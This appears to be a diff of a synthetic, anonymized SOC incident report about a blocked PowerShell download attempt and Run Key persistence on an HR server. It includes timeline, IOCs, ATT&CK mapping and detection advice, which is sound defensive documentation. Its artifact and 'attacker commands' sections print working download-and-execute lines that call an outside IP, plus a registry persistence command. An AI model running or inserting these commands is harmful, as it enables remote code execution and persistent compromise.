@@ -1,13 +1,17 @@
-# 🛡 Suspicious PowerShell in HR Server
+🛡 Suspicious PowerShell in HR Server (Anonymized)
 
-## 📌 Executive Summary
-During routine SOC monitoring, a suspicious PowerShell command was detected on an internal HR application server. The command attempted to download a remote script from a non-whitelisted domain. No lateral movement was observed, but persistence mechanisms were deployed.
+📌 Executive Summary
 
-**🎯 Outcome:** early detection prevented potential ransomware execution.
+During routine SOC monitoring, a suspicious PowerShell command was detected on an internal HR application server.
+The command attempted to download a remote script from a non-whitelisted domain.
+Persistence was deployed via a registry Run Key, but no lateral movement was observed.
 
----
+🎯 Outcome: early detection and containment prevented potential ransomware execution.
 
-## 🖼 Attack Flow (ASCII Diagram)
+_______________________________________________________________________________________________________________________________________________
+
+🖼 Attack Flow (ASCII Diagram)
+
 
 +--------------------------+
 | SOC Alert: PowerShell    |
@@ -36,39 +40,169 @@ During routine SOC monitoring, a suspicious PowerShell command was detected on a
 | Contained & Removed      |
 +--------------------------+
 
----
+_______________________________________________________________________________________________________________________________________________
 
-## ⏱ Timeline (UTC)
-- 09:11 – EDR flagged encoded PowerShell.  
-- 09:13 – Analyst confirmed outbound connection attempt.  
-- 09:20 – File quarantined; endpoint isolated.  
-- 10:05 – Registry persistence cleaned.  
-- 11:00 – Server returned to production.  
+📖 Attack Narrative
 
----
 
-## 🔑 Key Findings
-- Suspicious PowerShell command base64-encoded.  
-- Connection to IP in ASN flagged as malicious by VirusTotal.  
-- Dropper failed to execute due to network block.  
+🥷 Stage 1 – Execution
 
----
+EDR flagged suspicious base64-encoded PowerShell on HR server.
 
-## 🗂️ MITRE ATT&CK Mapping
-- **T1059.001 – PowerShell**  
-- **T1105 – Exfiltration Over C2 Channel**  
-- **T1547 – Boot or Logon Autostart Execution**  
+Command invoked Invoke-WebRequest targeting a suspicious IP.
 
----
 
-## 👀 Detection Use Cases
-- Alert on PowerShell with base64-encoded args.  
-- Monitor unusual outbound Invoke-WebRequest.  
-- Detect Run Key persistence additions.  
+🌐 Stage 2 – Delivery Attempt
 
----
+Payload attempted to save dropper into %TEMP%\updater.ps1.
 
-## 🛡️ Recommendations
-- Block outbound traffic to untrusted IPs.  
-- Increase monitoring of PowerShell usage in servers.  
-- Enforce AppLocker/Defender ASR rules for script execution.  
+Outbound request blocked by proxy (TI-flagged ASN).
+
+
+🛠 Stage 3 – Persistence
+
+Registry Run Key created: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater.
+
+
+🛡 Stage 4 – Containment
+
+File quarantined, endpoint isolated.
+
+Run Key deleted. Server returned to production after IR validation.
+
+_______________________________________________________________________________________________________________________________________________
+
+⏱ Timeline (UTC)
+
+| Time  | Event                                                   |
+| ----- | ------------------------------------------------------- |
+| 09:11 | 🚨 EDR flagged suspicious encoded PowerShell            |
+| 09:13 | 🌐 Outbound connection attempt detected (Invoke-WebReq) |
+| 09:20 | 🛑 Dropper quarantined; server isolated                 |
+| 10:05 | 🧹 Persistence (Run Key) cleaned                        |
+| 11:00 | ✅ Server returned to production                        |
+
+_______________________________________________________________________________________________________________________________________________
+
+📂 Artifacts (Synthetic / Anonymized)
+
+
+EDR Detection Log:
+
+{
+  "time": "2025-06-04T09:11:04Z",
+  "host": "HR-SRV01",
+  "process": "powershell.exe",
+  "commandLine": "powershell.exe -enc SQBtAHYAbwBrAGUALQBXAGUAYgBSAGUA...==",
+  "user": "svc-hrapp",
+  "action": "alert"
+}
+
+Decoded PowerShell Command:
+
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://185.203.114.55/updater.ps1')"
+
+Proxy Log (Blocked):
+
+{
+  "time": "2025-06-04T09:13:22Z",
+  "srcHost": "HR-SRV01",
+  "dstIP": "185.203.114.55",
+  "url": "http://185.203.114.55/updater.ps1",
+  "action": "BLOCK",
+  "reason": "Threat Intel Malicious ASN"
+}
+
+
+Registry Persistence (Run Key):
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+   Updater   REG_SZ   powershell.exe -ExecutionPolicy Bypass -File %TEMP%\updater.ps1
+
+_______________________________________________________________________________________________________________________________________________
+
+💻 Attacker Commands (Reconstructed, Synthetic)
+
+
+# Encoded PowerShell payload
+powershell.exe -enc SQBtAHYAbwBrAGUALQBXAGUAYgBSAGUA...==
+
+# Decoded behavior
+Invoke-WebRequest -Uri "http://185.203.114.55/updater.ps1" -OutFile "$env:TEMP\updater.ps1"
+Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $env:TEMP\updater.ps1"
+
+# Persistence
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File %TEMP%\updater.ps1"
+
+_______________________________________________________________________________________________________________________________________________
+
+🧾 IOCs (Synthetic)
+
+
+| Type       | Value                                                      | Source            | Status      |
+| ---------- | ---------------------------------------------------------- | ----------------- | ----------- |
+| 🌐 IP      | 185.203.114.55                                             | Proxy logs        | Malicious   |
+| 📎 File    | updater.ps1 (SHA256: e3b2c44298fc…)                        | Sandbox           | Malicious   |
+| 🔑 RunKey  | HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater | Registry snapshot | Persistence |
+| 👤 Account | svc-hrapp                                                  | EDR logs          | Abused      |
+
+_______________________________________________________________________________________________________________________________________________
+
+🔑 Key Findings
+
+
+🚨 Base64-encoded PowerShell flagged by EDR.
+
+🌐 Outbound attempt to malicious IP (blocked).
+
+🛠 Run Key persistence mechanism created.
+
+✅ No lateral movement observed.
+
+_______________________________________________________________________________________________________________________________________________
+
+🗂️ MITRE ATT&CK Mapping
+
+
+T1059.001 – PowerShell
+
+T1105 – Ingress Tool Transfer (Invoke-WebRequest)
+
+T1547 – Boot or Logon Autostart Execution (Registry Run Key)
+
+_______________________________________________________________________________________________________________________________________________
+
+👀 Detection Use Cases
+
+
+🚨 Alert on powershell.exe -enc with long base64 strings.
+
+🚨 Monitor outbound Invoke-WebRequest to non-whitelisted IPs.
+
+🛠 Detect Run Key modifications in registry.
+
+_______________________________________________________________________________________________________________________________________________
+
+🛡️ Response Actions
+
+
+❌ Quarantined malicious script & removed persistence.
+
+🔒 Blocked external IP across perimeter.
+
+📑 IOC shared with TI platform.
+
+📚 Educated system owners about secure PowerShell usage.
+
+_______________________________________________________________________________________________________________________________________________
+
+🛡️ Recommendations
+
+
+🔐 Block outbound traffic to untrusted IPs/domains.
+
+🚨 Increase monitoring of PowerShell with base64 arguments.
+
+🛡 Enforce AppLocker/ASR rules to restrict script execution.
+
+🧹 Regular auditing of autorun registry keys.
